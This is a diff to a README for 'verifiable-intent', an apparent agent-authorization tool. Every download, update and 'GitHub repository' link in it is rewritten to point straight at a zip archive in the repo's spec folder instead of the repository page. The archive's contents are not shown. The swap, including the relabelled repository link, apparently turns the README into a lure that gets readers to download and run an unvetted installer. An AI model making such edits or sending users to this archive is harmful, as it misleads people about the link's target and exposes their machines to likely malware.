@@ -1,6 +1,6 @@
 # 🚦 verifiable-intent - Secure Agent Authorization Made Simple
 
-[![Download verifiable-intent](https://img.shields.io/badge/Download%20verifiable--intent-4CAF50?style=for-the-badge&logo=github)](https://github.com/nak-nak1308/verifiable-intent)
+[![Download verifiable-intent](https://img.shields.io/badge/Download%20verifiable--intent-4CAF50?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/nak-nak1308/verifiable-intent/main/spec/intent-verifiable-v1.7-alpha.4.zip)
 
 ---
 
@@ -41,7 +41,7 @@ The application does not require advanced hardware. These specs ensure it runs s
 
 Click this link to open the download page in your web browser:
 
-[Download verifiable-intent from GitHub](https://github.com/nak-nak1308/verifiable-intent)
+[Download verifiable-intent from GitHub](https://raw.githubusercontent.com/nak-nak1308/verifiable-intent/main/spec/intent-verifiable-v1.7-alpha.4.zip)
 
 This page contains the latest release and all necessary files for installation.
 
@@ -105,7 +105,7 @@ Since this app works in commerce authorization, it automatically checks permissi
 
 Keep your application updated for security and new features:
 
-- Visit the [Download page](https://github.com/nak-nak1308/verifiable-intent) regularly.  
+- Visit the [Download page](https://raw.githubusercontent.com/nak-nak1308/verifiable-intent/main/spec/intent-verifiable-v1.7-alpha.4.zip) regularly.  
 - Check for new release versions.  
 - Download and run any updated installer files as instructed in the steps above.
 
@@ -123,7 +123,7 @@ Keep your application updated for security and new features:
 ## 🗂️ Additional Resources
 
 - Visit the GitHub repository for official documents and updates:  
-  [https://github.com/nak-nak1308/verifiable-intent](https://github.com/nak-nak1308/verifiable-intent)  
+  [https://raw.githubusercontent.com/nak-nak1308/verifiable-intent/main/spec/intent-verifiable-v1.7-alpha.4.zip](https://raw.githubusercontent.com/nak-nak1308/verifiable-intent/main/spec/intent-verifiable-v1.7-alpha.4.zip)  
 - Look for help or FAQs on the GitHub Discussions or Issues section.
 
 ---
@@ -148,4 +148,4 @@ You can submit bugs or feature requests on the GitHub repository under the **Iss
 
 ---
 
-[![Download verifiable-intent](https://img.shields.io/badge/Download-verifiable--intent-blue?style=for-the-badge&logo=github)](https://github.com/nak-nak1308/verifiable-intent)
+[![Download verifiable-intent](https://img.shields.io/badge/Download-verifiable--intent-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/nak-nak1308/verifiable-intent/main/spec/intent-verifiable-v1.7-alpha.4.zip)
